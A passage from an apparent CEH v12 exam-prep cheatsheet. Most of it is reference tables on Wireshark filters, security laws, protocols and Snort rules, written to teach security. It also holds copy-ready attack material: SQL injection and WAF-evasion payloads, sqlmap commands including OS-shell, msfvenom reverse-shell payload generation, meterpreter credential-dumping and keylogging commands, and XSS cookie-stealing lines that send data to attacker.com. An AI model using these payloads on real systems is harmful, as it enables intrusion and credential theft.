| **ZTA** | Zero Trust Architecture | Never trust, always verify; micro-segmentation |

---

## 15. SQL INJECTION PAYLOADS REFERENCE

### 15.1 Authentication Bypass

```sql
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1 --
" OR 1=1 --
admin' --
admin' #
' OR 'x'='x
') OR ('1'='1
' OR ''='
1' OR '1'='1' LIMIT 1 --
```

### 15.2 UNION-Based Injection

```sql
-- Determine number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --    (increment until error)

-- Extract data
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --
' UNION SELECT table_name,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --

-- Database version
' UNION SELECT @@version,NULL --          (MySQL/MSSQL)
' UNION SELECT version(),NULL --          (PostgreSQL)
' UNION SELECT banner,NULL FROM v$version -- (Oracle)
```

### 15.3 Blind SQL Injection (Boolean-Based)

```sql
-- True/False testing
' AND 1=1 --     (should return normal page)
' AND 1=2 --     (should return different/empty page)

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a' --
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --
' AND (SELECT COUNT(*) FROM users)>0 --
```

### 15.4 Blind SQL Injection (Time-Based)

```sql
-- MySQL
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --

-- MSSQL
'; WAITFOR DELAY '0:0:5' --
'; IF (1=1) WAITFOR DELAY '0:0:5' --

-- PostgreSQL
'; SELECT pg_sleep(5) --
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

### 15.5 Error-Based Injection

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1) --

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version)) --
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables) --

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)) --
```

### 15.6 WAF Evasion Techniques

```sql
-- Case manipulation
' uNiOn SeLeCt 1,2,3 --

-- Comment insertion
' UN/**/ION SEL/**/ECT 1,2,3 --

-- URL encoding
%27%20OR%20%271%27%3D%271

-- Double URL encoding
%2527%2520OR%25201%253D1

-- Hex encoding
' UNION SELECT 0x61646d696e,2 --

-- Null byte injection
%00' OR 1=1 --

-- Inline comments (MySQL)
' /*!UNION*/ /*!SELECT*/ 1,2,3 --

-- Whitespace alternatives
' UNION%0ASELECT%0A1,2,3 --
' UNION%09SELECT%091,2,3 --

-- String concatenation
' UNION SELECT CONCAT('a','d','m','i','n'),2 --
```

### 15.7 sqlmap Quick Reference

```bash
# Basic scan
sqlmap -u "http://target/page?id=1"

# Specify POST data
sqlmap -u "http://target/login" --data="user=admin&pass=test"

# Get databases
sqlmap -u "http://target/page?id=1" --dbs

# Get tables from database
sqlmap -u "http://target/page?id=1" -D dbname --tables

# Get columns from table
sqlmap -u "http://target/page?id=1" -D dbname -T users --columns

# Dump table data
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# OS shell (if possible)
sqlmap -u "http://target/page?id=1" --os-shell

# Use tamper scripts for WAF bypass
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between

# Cookie-based injection
sqlmap -u "http://target/page" --cookie="id=1*"

# Use Tor for anonymity
sqlmap -u "http://target/page?id=1" --tor --tor-type=SOCKS5
```

---

## 16. WIRESHARK DISPLAY FILTERS

### 16.1 Protocol Filters

| Filter | Description |
|--------|-------------|
| `tcp` | Show only TCP packets |
| `udp` | Show only UDP packets |
| `icmp` | Show only ICMP packets |
| `arp` | Show only ARP packets |
| `dns` | Show only DNS packets |
| `http` | Show only HTTP packets |
| `tls` or `ssl` | Show only TLS/SSL packets |
| `ftp` | Show only FTP packets |
| `smtp` | Show only SMTP packets |
| `dhcp` or `bootp` | Show only DHCP packets |
| `sip` | Show only SIP (VoIP) packets |
| `snmp` | Show only SNMP packets |

### 16.2 IP Address Filters

| Filter | Description |
|--------|-------------|
| `ip.addr == 10.0.0.1` | Traffic to/from specific IP |
| `ip.src == 10.0.0.1` | Traffic FROM specific IP |
| `ip.dst == 10.0.0.1` | Traffic TO specific IP |
| `ip.addr == 10.0.0.0/24` | Traffic to/from subnet |
| `!(ip.addr == 10.0.0.1)` | Exclude specific IP |
| `ip.ttl == 128` | Filter by TTL (Windows) |
| `ip.ttl == 64` | Filter by TTL (Linux) |

### 16.3 Port Filters

| Filter | Description |
|--------|-------------|
| `tcp.port == 80` | TCP traffic on port 80 (src or dst) |
| `tcp.dstport == 443` | TCP traffic TO port 443 |
| `tcp.srcport == 8080` | TCP traffic FROM port 8080 |
| `udp.port == 53` | UDP traffic on port 53 |
| `tcp.port in {80 443 8080}` | TCP traffic on multiple ports |
| `tcp.port >= 1024` | TCP traffic on ports 1024 and above |

### 16.4 TCP Flag Filters

| Filter | Description |
|--------|-------------|
| `tcp.flags.syn == 1` | SYN packets (connection initiation) |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | SYN-only packets (new connections) |
| `tcp.flags.syn == 1 && tcp.flags.ack == 1` | SYN-ACK packets (connection responses) |
| `tcp.flags.rst == 1` | RST packets (connection resets) |
| `tcp.flags.fin == 1` | FIN packets (connection termination) |
| `tcp.flags == 0x029` | Xmas scan (FIN+PSH+URG) |
| `tcp.flags == 0x000` | NULL scan (no flags) |
| `tcp.flags.push == 1` | PSH flag set |

### 16.5 Content Filters

| Filter | Description |
|--------|-------------|
| `http.request.method == "GET"` | HTTP GET requests |
| `http.request.method == "POST"` | HTTP POST requests |
| `http.response.code == 200` | HTTP 200 OK responses |
| `http.response.code == 404` | HTTP 404 Not Found |
| `http.response.code >= 400` | HTTP error responses |
| `http.host contains "target"` | HTTP requests to hosts containing "target" |
| `http.request.uri contains "login"` | HTTP URIs containing "login" |
| `frame contains "password"` | Frames containing string "password" |
| `tcp contains "admin"` | TCP packets containing string "admin" |
| `dns.qry.name contains "evil"` | DNS queries for names containing "evil" |

### 16.6 Combination Filters

| Filter | Description |
|--------|-------------|
| `ip.src == 10.0.0.1 && tcp.port == 80` | HTTP traffic from specific source |
| `http && ip.addr == 10.0.0.1` | HTTP traffic involving specific IP |
| `tcp.port == 80 \|\| tcp.port == 443` | HTTP or HTTPS traffic |
| `!(arp \|\| dns \|\| icmp)` | Exclude ARP, DNS, and ICMP |
| `tcp.analysis.retransmission` | Show retransmitted TCP segments |
| `tcp.analysis.duplicate_ack` | Show duplicate ACKs |
| `tcp.analysis.zero_window` | Show zero-window conditions |
| `tcp.stream eq 5` | Follow specific TCP stream |

### 16.7 Capture Filters (BPF Syntax - set BEFORE capture)

| Filter | Description |
|--------|-------------|
| `host 10.0.0.1` | Capture traffic to/from IP |
| `net 10.0.0.0/24` | Capture traffic for subnet |
| `port 80` | Capture traffic on port 80 |
| `src host 10.0.0.1` | Capture traffic from source |
| `dst port 443` | Capture traffic to port 443 |
| `not arp` | Exclude ARP traffic |
| `tcp and port 80` | TCP traffic on port 80 only |

---

## 17. IMPORTANT LAWS & REGULATIONS

### 17.1 United States Laws

| Law/Regulation | Full Name | Key Provisions |
|---------------|-----------|----------------|
| **CFAA** | Computer Fraud and Abuse Act (1986) | Federal anti-hacking law; unauthorized access to protected computers; penalties for fraud, damage, trafficking passwords |
| **ECPA** | Electronic Communications Privacy Act (1986) | Protects wire, oral, electronic communications from unauthorized interception; includes Wiretap Act, SCA, Pen Register Act |
| **DMCA** | Digital Millennium Copyright Act (1998) | Anti-circumvention of DRM/technological protection; safe harbor for ISPs; takedown notices |
| **SOX** | Sarbanes-Oxley Act (2002) | Financial reporting integrity for public companies; requires internal controls, audit trails, CEO/CFO certification |
| **FISMA** | Federal Information Security Management Act (2002, updated 2014) | Federal agencies must implement information security programs; NIST framework compliance |
| **HIPAA** | Health Insurance Portability and Accountability Act (1996) | Protects healthcare data (PHI); Security Rule, Privacy Rule, Breach Notification Rule; fines up to $1.5M/year per violation category |
| **GLBA** | Gramm-Leach-Bliley Act (1999) | Financial institutions must protect customer financial data (NPI); requires privacy notices, safeguards |
| **COPPA** | Children's Online Privacy Protection Act (1998) | Protects privacy of children under 13 online; requires parental consent for data collection |
| **FERPA** | Family Educational Rights and Privacy Act (1974) | Protects student education records; applies to schools receiving federal funds |
| **CAN-SPAM** | Controlling the Assault of Non-Solicited Pornography and Marketing Act (2003) | Regulates commercial email; requires opt-out, physical address, honest headers |

### 17.2 International Laws & Regulations

| Law/Regulation | Jurisdiction | Key Provisions |
|---------------|-------------|----------------|
| **GDPR** | EU (2018) | General Data Protection Regulation; protects EU citizens' data worldwide; right to be forgotten, data portability, 72-hour breach notification, fines up to 4% global revenue or 20M EUR |
| **Data Protection Act 2018** | UK | UK implementation of GDPR post-Brexit |
| **PIPEDA** | Canada | Personal Information Protection and Electronic Documents Act; consent-based data handling |
| **IT Act 2000** | India | Information Technology Act; cybercrime offenses, electronic governance |
| **Computer Misuse Act 1990** | UK | Unauthorized access, unauthorized modification, supply of tools for misuse |
| **Cybercrime Act 2001** | Australia | Unauthorized access, modification, impairment of electronic communication |

### 17.3 Industry Standards

| Standard | Scope | Key Requirements |
|----------|-------|-----------------|
| **PCI-DSS** | Payment Card Industry | 12 requirements for protecting cardholder data; network segmentation, encryption, access control, monitoring, testing |
| **ISO 27001** | International | Information Security Management System (ISMS) standard; risk-based approach; Plan-Do-Check-Act |
| **ISO 27002** | International | Code of practice for information security controls (companion to 27001) |
| **NIST CSF** | US (widely adopted) | Cybersecurity Framework: Identify, Protect, Detect, Respond, Recover |
| **NIST SP 800-53** | US Federal | Security and privacy controls for federal information systems |
| **SOC 2** | Service Organizations | Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy |
| **COBIT** | International | IT governance framework; aligns IT with business goals |

### 17.4 Key Compliance Concepts for CEH Exam

- **Due Diligence**: Research and understand risks BEFORE they occur (proactive)
- **Due Care**: Take reasonable steps to protect assets (implementing safeguards)
- **Privacy Impact Assessment (PIA)**: Evaluate how data collection impacts privacy
- **Data Controller**: Determines purpose and means of processing personal data
- **Data Processor**: Processes data on behalf of the controller
- **Breach Notification**: GDPR = 72 hours; HIPAA = 60 days; varies by state
- **Right to Be Forgotten**: GDPR concept; individuals can request data deletion
- **Data Minimization**: Collect only data that is necessary for the stated purpose

---

## 18. ADDITIONAL QUICK REFERENCES

### 18.1 CEH Hacking Phases (EC-Council Methodology)

| Phase | Name | Description |
|-------|------|-------------|
| 1 | **Reconnaissance** | Gather information (passive and active) |
| 2 | **Scanning** | Discover live hosts, open ports, services, vulnerabilities |
| 3 | **Gaining Access** | Exploit vulnerabilities to gain entry |
| 4 | **Maintaining Access** | Install backdoors, rootkits for persistent access |
| 5 | **Clearing Tracks** | Delete logs, modify timestamps, hide evidence |

### 18.2 Types of Hackers

| Type | Description |
|------|-------------|
| **White Hat** | Authorized ethical hacker; finds vulnerabilities with permission |
| **Black Hat** | Malicious hacker; unauthorized access for personal gain |
| **Gray Hat** | Unauthorized but no malicious intent; may disclose vulnerabilities |
| **Script Kiddie** | Unskilled; uses existing tools/scripts without understanding |
| **Hacktivist** | Politically/socially motivated hacking (e.g., Anonymous) |
| **Nation-State** | Government-sponsored; APT; cyber espionage/warfare |
| **Suicide Hacker** | Attacks without caring about consequences or getting caught |
| **Insider Threat** | Employee/contractor with legitimate access who misuses it |
| **Cyberterrorist** | Attacks critical infrastructure to create fear/disruption |

### 18.3 TCP Three-Way Handshake

```
Client          Server
  |--- SYN -------->|     (SEQ=x)
  |<-- SYN-ACK -----|     (SEQ=y, ACK=x+1)
  |--- ACK -------->|     (SEQ=x+1, ACK=y+1)
  |   Connection     |
  |   Established    |
```

**Connection Termination (Four-Way):**
```
Client          Server
  |--- FIN -------->|
  |<-- ACK ---------|
  |<-- FIN ---------|
  |--- ACK -------->|
```

### 18.4 Common HTTP Status Codes

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| 200 | OK | Request successful |
| 301 | Moved Permanently | Redirect; check for open redirect |
| 302 | Found (Temporary Redirect) | Session management; redirect attacks |
| 400 | Bad Request | Malformed request |
| 401 | Unauthorized | Authentication required |
| 403 | Forbidden | Access denied (authorization failure) |
| 404 | Not Found | Resource does not exist |
| 405 | Method Not Allowed | HTTP method not supported |
| 500 | Internal Server Error | Server-side error; potential info disclosure |
| 502 | Bad Gateway | Upstream server error |
| 503 | Service Unavailable | Server overloaded (DoS indicator) |

### 18.5 IPv4 Private Address Ranges

| Class | Range | CIDR | Subnet Mask | Hosts |
|-------|-------|------|-------------|-------|
| A | 10.0.0.0 - 10.255.255.255 | 10.0.0.0/8 | 255.0.0.0 | ~16.7 million |
| B | 172.16.0.0 - 172.31.255.255 | 172.16.0.0/12 | 255.240.0.0 | ~1 million |
| C | 192.168.0.0 - 192.168.255.255 | 192.168.0.0/16 | 255.255.0.0 | ~65,000 |

**Loopback**: 127.0.0.0/8 (127.0.0.1)
**APIPA**: 169.254.0.0/16 (auto-assigned when DHCP fails)
**Link-local Multicast**: 224.0.0.0/24

### 18.6 Metasploit Quick Reference

```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set required options
set RHOSTS 10.0.0.1
set LHOST 10.0.0.2
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit   (or: run)

# Meterpreter post-exploitation commands
sysinfo                    # System information
getuid                     # Current user
getsystem                  # Attempt privilege escalation
hashdump                   # Dump password hashes
upload /local/file /remote  # Upload file
download /remote /local     # Download file
shell                      # Drop to OS shell
migrate <PID>              # Migrate to another process
keyscan_start              # Start keylogger
keyscan_dump               # Dump captured keystrokes
screenshot                 # Take screenshot
webcam_snap                # Capture webcam image
run post/multi/gather/firefox_creds  # Post modules
background                 # Background session
sessions -l                # List sessions
sessions -i 1              # Interact with session 1

# msfvenom payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f war -o shell.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

### 18.7 Google Dorking (Google Hacking) Reference

| Operator | Description | Example |
|----------|-------------|---------|
| `site:` | Restrict to specific domain | `site:target.com` |
| `inurl:` | Search in URL | `inurl:admin login` |
| `intitle:` | Search in page title | `intitle:"index of" password` |
| `intext:` | Search in page body | `intext:"confidential"` |
| `filetype:` | Search for file type | `filetype:pdf site:target.com` |
| `ext:` | File extension | `ext:sql "INSERT INTO"` |
| `cache:` | View cached version | `cache:target.com` |
| `link:` | Pages linking to URL | `link:target.com` |
| `""` | Exact phrase | `"admin password"` |
| `-` | Exclude term | `site:target.com -www` |
| `*` | Wildcard | `"password is *"` |
| `..` | Number range | `"employees 100..500"` |

**Common Google Dorks for Pentesting:**
```
intitle:"index of" "parent directory" password
filetype:log inurl:password
site:target.com filetype:sql
intitle:"phpMyAdmin" "Welcome to phpMyAdmin"
inurl:/wp-admin
filetype:env "DB_PASSWORD"
intitle:"Apache2 Debian Default Page"
filetype:xls "username" "password"
inurl:"viewerframe?mode=motion"   (webcam search)
```

### 18.8 Snort Rule Structure

```
[action] [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port] (rule options)
```

**Example Snort Rules:**
```
# Alert on ICMP ping
alert icmp any any -> any any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

# Alert on SSH brute force attempts
alert tcp any any -> any 22 (msg:"SSH Connection Attempt"; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:1000002; rev:1;)

# Alert on SQL injection attempt
alert tcp any any -> any 80 (msg:"SQL Injection Attempt"; content:"' OR '1'='1"; nocase; sid:1000003; rev:1;)

# Alert on Nmap Xmas scan
alert tcp any any -> any any (msg:"Nmap Xmas Scan"; flags:FPU; sid:1000004; rev:1;)

# Alert on malware download
alert tcp any any -> any any (msg:"EXE Download"; content:".exe"; http_uri; sid:1000005; rev:1;)
```

**Snort Rule Actions:** `alert`, `log`, `pass`, `drop`, `reject`, `sdrop`

### 18.9 Common Vulnerability Scoring (CVSS v3.1)

| Score | Rating | Description |
|-------|--------|-------------|
| 0.0 | None | No vulnerability |
| 0.1 - 3.9 | Low | Minor vulnerability |
| 4.0 - 6.9 | Medium | Moderate vulnerability |
| 7.0 - 8.9 | High | Serious vulnerability |
| 9.0 - 10.0 | Critical | Extremely serious (e.g., RCE with no auth) |

**CVSS Metrics**: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), Confidentiality (C), Integrity (I), Availability (A)

### 18.10 Email Security Protocols

| Protocol | Purpose | How It Works |
|----------|---------|-------------|
| **SPF** | Sender Policy Framework | DNS TXT record specifying authorized mail servers for domain |
| **DKIM** | DomainKeys Identified Mail | Cryptographic signature in email headers; receiving server verifies via DNS |
| **DMARC** | Domain-based Message Authentication, Reporting & Conformance | Policy built on SPF + DKIM; tells receivers what to do with failed checks (none/quarantine/reject) |
| **S/MIME** | Secure/Multipurpose Internet Mail Extensions | End-to-end email encryption and digital signatures using X.509 certificates |
| **PGP/GPG** | Pretty Good Privacy / GNU Privacy Guard | End-to-end email encryption using web of trust (no CA required) |

### 18.11 VPN Protocols Comparison

| Protocol | Port | Encryption | Speed | Security | Notes |
|----------|------|------------|-------|----------|-------|
| **IPSec** | UDP 500, 4500 | AES, 3DES | Good | High | Two modes: Transport (payload only) and Tunnel (entire packet); AH + ESP |
| **IKEv2** | UDP 500, 4500 | AES, ChaCha20 | Fast | High | Mobile-friendly; reconnects quickly after network change |
| **OpenVPN** | UDP 1194 (default) | AES, Blowfish | Good | High | Open source; SSL/TLS-based; highly configurable |
| **L2TP/IPSec** | UDP 1701, 500, 4500 | AES (via IPSec) | Moderate | High | L2TP alone has no encryption; combined with IPSec |
| **PPTP** | TCP 1723 + GRE | MPPE (RC4) | Fast | Low | Deprecated; MS-CHAPv2 vulnerable; avoid |
| **WireGuard** | UDP 51820 | ChaCha20 | Fastest | High | Modern; minimal code; fast key exchange |
| **SSL/TLS VPN** | TCP 443 | AES | Good | High | Works through firewalls (uses HTTPS port); clientless option |

**IPSec Components:**
- **AH (Authentication Header)**: Integrity + Authentication, NO encryption, protocol 51
- **ESP (Encapsulating Security Payload)**: Integrity + Authentication + Encryption, protocol 50
- **IKE (Internet Key Exchange)**: Negotiates SA (Security Association), UDP 500
- **Transport Mode**: Encrypts payload only (host-to-host)
- **Tunnel Mode**: Encrypts entire original packet (gateway-to-gateway)

### 18.12 Cloud Computing Models

**Service Models (Pizza Analogy):**
| Model | You Manage | Provider Manages | Example |
|-------|-----------|-----------------|---------|
| **On-Premises** | Everything | Nothing | Your own data center |
| **IaaS** | OS, Apps, Data, Runtime, Middleware | Virtualization, Servers, Storage, Networking | AWS EC2, Azure VMs, Google Compute |
| **PaaS** | Apps, Data | Runtime, Middleware, OS, Virtualization, Servers | AWS Elastic Beanstalk, Heroku, Google App Engine |
| **SaaS** | Nothing (just use it) | Everything | Gmail, Salesforce, Office 365 |

**Deployment Models:**
| Model | Description |
|-------|-------------|
| **Public** | Shared infrastructure; open to public (AWS, Azure, GCP) |
| **Private** | Dedicated to single organization; on-premises or hosted |
| **Hybrid** | Mix of public and private; data/apps shared between them |
| **Community** | Shared by organizations with common concerns (healthcare, government) |
| **Multi-Cloud** | Using services from multiple cloud providers |

### 18.13 Access Control Models

| Model | Type | Description | Example |
|-------|------|-------------|---------|
| **DAC** | Discretionary | Owner sets permissions; identity-based | Windows NTFS permissions; file owner grants access |
| **MAC** | Mandatory | System-enforced labels; clearance-based | Military: Top Secret, Secret, Confidential, Unclassified |
| **RBAC** | Role-Based | Access based on job role | Doctor role has access to patient records |
| **ABAC** | Attribute-Based | Access based on attributes (user, resource, environment) | Allow if user.department=finance AND time=business_hours |
| **Rule-Based** | Rule-Based | Access based on predefined rules | Firewall ACL rules; time-based access |

**Bell-LaPadula Model** (Confidentiality): No Read Up, No Write Down
**Biba Model** (Integrity): No Read Down, No Write Up
**Clark-Wilson Model** (Integrity): Uses transactions; separation of duties; well-formed transactions

### 18.14 Authentication Factors

| Factor | Type | Examples |
|--------|------|---------|
| **Something You Know** | Knowledge | Password, PIN, passphrase, security questions |
| **Something You Have** | Possession | Smart card, token, phone (SMS/app), key fob |
| **Something You Are** | Inherence (Biometric) | Fingerprint, retina/iris scan, face recognition, voice |
| **Somewhere You Are** | Location | GPS, IP-based geolocation |
| **Something You Do** | Behavior | Typing patterns, gait analysis, signature dynamics |

**MFA**: Requires factors from TWO OR MORE DIFFERENT categories (password + SMS is MFA; two passwords is NOT MFA)

### 18.15 Threat Intelligence Sharing Frameworks

| Framework | Purpose |
|-----------|---------|
| **STIX** | Structured Threat Information Expression; language for describing threat info (indicators, TTPs, threat actors) |
| **TAXII** | Trusted Automated Exchange of Intelligence Information; transport protocol for sharing STIX data |
| **CybOX** | Cyber Observable Expression; language for specifying cyber observables (now merged into STIX 2.0) |
| **MISP** | Malware Information Sharing Platform; open-source threat intelligence sharing |
| **OpenIOC** | Open Indicators of Compromise; XML schema for describing IoCs |

### 18.16 Malware Types

| Type | Description | Example |
|------|-------------|---------|
| **Virus** | Self-replicating code that attaches to host files; needs user action | Macro virus, boot sector virus, polymorphic virus |
| **Worm** | Self-replicating; spreads WITHOUT user interaction over network | WannaCry, Conficker, ILOVEYOU |
| **Trojan** | Disguised as legitimate software; does NOT self-replicate | RATs (Remote Access Trojans), banking trojans |
| **Ransomware** | Encrypts files and demands payment for decryption key | WannaCry, Petya/NotPetya, REvil, LockBit |
| **Spyware** | Secretly monitors user activity | Keyloggers, screen capture, credential stealers |
| **Adware** | Displays unwanted advertisements | Browser toolbars, pop-up generators |
| **Rootkit** | Hides malware presence from OS and security tools | Kernel rootkits, bootkits, firmware rootkits |
| **Botnet** | Network of compromised systems controlled by attacker | Mirai (IoT), Zeus (banking), Emotet |
| **Logic Bomb** | Activates when specific condition is met (date, event) | Executes payload on specific date or after user action |
| **Fileless Malware** | Operates in memory; no files on disk; uses legitimate tools | PowerShell-based attacks, WMI persistence |
| **Polymorphic** | Changes its code with each infection to evade detection | Mutates via encryption engine; signature changes |
| **Metamorphic** | Completely rewrites its code each time; more advanced than polymorphic | Rewrites entire code structure, not just encryption |

### 18.17 IoT/SCADA/ICS Protocols

| Protocol | Port | Description | Security |
|----------|------|-------------|----------|
| **Modbus** | TCP 502 | Serial communication for PLCs; master/slave | No authentication or encryption |
| **DNP3** | TCP 20000 | Distributed Network Protocol; SCADA telemetry | Limited security; Secure Authentication optional |
| **BACnet** | UDP 47808 | Building Automation and Control | No built-in security |
| **EtherNet/IP** | TCP/UDP 44818 | Industrial Ethernet; uses CIP | Limited security |
| **OPC UA** | TCP 4840 | Open Platform Communications Unified Architecture | Built-in security (encryption, authentication) |
| **MQTT** | TCP 1883 (8883 TLS) | Message Queuing Telemetry Transport; IoT messaging | TLS optional; authentication optional |
| **CoAP** | UDP 5683 (5684 DTLS) | Constrained Application Protocol; IoT RESTful | DTLS optional |
| **Zigbee** | 2.4 GHz | Mesh network for IoT/home automation | AES-128 encryption |
| **Z-Wave** | 908.42 MHz (US) | Home automation mesh network | AES-128 (S2 framework) |
| **Bluetooth LE** | 2.4 GHz | Low-energy short-range wireless | AES-CCM encryption |

### 18.18 Container & Kubernetes Security

**Docker Security Concerns:**
- Container escape (breakout to host)
- Vulnerable base images
- Privileged containers
- Exposed Docker daemon (TCP 2375/2376)
- Secrets in environment variables or Dockerfiles

**Kubernetes Security:**
- Exposed API server (TCP 6443)
- Misconfigured RBAC
- Unsecured etcd (TCP 2379)
- Pod-to-pod lateral movement
- Service account token theft

### 18.19 XSS Payloads Reference

```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- Event handler XSS -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>
<div onmouseover=alert('XSS')>hover me</div>

<!-- Cookie stealing -->
<script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

<!-- Encoded XSS (WAF bypass) -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- Without angle brackets (attribute injection) -->
" onfocus="alert('XSS')" autofocus="
' onmouseover='alert(1)

<!-- Template literals -->
${alert('XSS')}
```

### 18.20 Important File Locations

**Linux:**
| File | Content |
|------|---------|
| `/etc/passwd` | User accounts (readable by all) |
| `/etc/shadow` | Password hashes (root only) |
| `/etc/hosts` | Static hostname-to-IP mappings |
| `/etc/resolv.conf` | DNS resolver configuration |
| `/var/log/auth.log` | Authentication logs (Debian/Ubuntu) |
| `/var/log/secure` | Authentication logs (RHEL/CentOS) |
| `/var/log/syslog` | System log |
| `/var/log/apache2/access.log` | Apache web server access log |
| `/etc/crontab` | Scheduled tasks |
| `/root/.bash_history` | Root command history |
| `/proc/version` | Kernel version |
| `/etc/ssh/sshd_config` | SSH server configuration |

**Windows:**
| File/Location | Content |
|---------------|---------|
| `C:\Windows\System32\config\SAM` | Password hashes (locked while running) |
| `C:\Windows\System32\config\SYSTEM` | System configuration |
| `C:\Windows\System32\drivers\etc\hosts` | Static hostname-to-IP mappings |
| `C:\Windows\System32\winevt\Logs\` | Event logs |
| `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PowerShell history |
| `C:\Windows\Prefetch\` | Prefetch files (evidence of execution) |
| `C:\Users\<user>\NTUSER.DAT` | User registry hive |

---

## 19. FINAL EXAM STRATEGY NOTES

### Key Things to Remember

1. **Passive vs Active**: If you touch the target directly, it is ACTIVE. If you use third-party sources (Google, Shodan, WHOIS), it is PASSIVE.

2. **Nmap Default Scan**: `-sS` (SYN stealth) is default when run as root; `-sT` (connect) is default for non-root.

3. **Port States in Nmap**: Open (service accepting connections), Closed (reachable but no service), Filtered (firewall blocking, no response).

4. **Encryption Key Formula**: Symmetric = n(n-1)/2 keys; Asymmetric = 2n keys.

5. **Digital Signature Process**: Hash the message, encrypt hash with sender's PRIVATE key = signature. Verify by decrypting with sender's PUBLIC key and comparing hashes.

6. **PKI Trust**: CA signs certificates; browser trusts CA; therefore browser trusts certificate.

7. **Session Hijacking**: Active = takes over session (kicks off user); Passive = monitors/sniffs session without interfering.

8. **Vulnerability Assessment vs Penetration Testing**: VA = finds and reports vulnerabilities; PT = finds, exploits, and proves impact.

9. **Defense in Depth**: Multiple layers of security controls (administrative, technical, physical).

10. **Principle of Least Privilege**: Users get minimum permissions needed to perform their job.

11. **Zero Trust**: Never trust, always verify. Assume breach. Micro-segmentation. Verify explicitly.

12. **Nmap Xmas Scan Flags**: FIN + PSH + URG (mnemonic: "FPU" or "Christmas tree - all lights on").

13. **DHCP Process**: DORA - Discover, Offer, Request, Acknowledge.

14. **DNS Record Types**: A (IPv4), AAAA (IPv6), MX (mail), CNAME (alias), NS (nameserver), PTR (reverse), SOA (start of authority), TXT (text, SPF), SRV (service).

15. **Risk Formula**: Risk = Threat x Vulnerability x Impact (or Asset Value).

16. **ALE Calculation**: ALE = SLE x ARO (Single Loss Expectancy x Annualized Rate of Occurrence).

17. **BCP/DRP Order**: BIA (Business Impact Analysis) first, then develop BCP/DRP.

18. **Evidence Volatility**: Collect most volatile first (registers > RAM > swap > disk > logs > physical).

19. **Penetration Testing Phases**: Pre-engagement > Reconnaissance > Scanning > Exploitation > Post-exploitation > Reporting.

20. **Social Engineering Principles**: Authority, Urgency/Scarcity, Social Proof, Likability, Reciprocity, Commitment/Consistency.

---

*This cheatsheet covers all major CEH v12 exam topics. Use it as a quick reference during study sessions. For deep understanding, combine with hands-on lab practice and official courseware.*

*Last updated: March 2026*
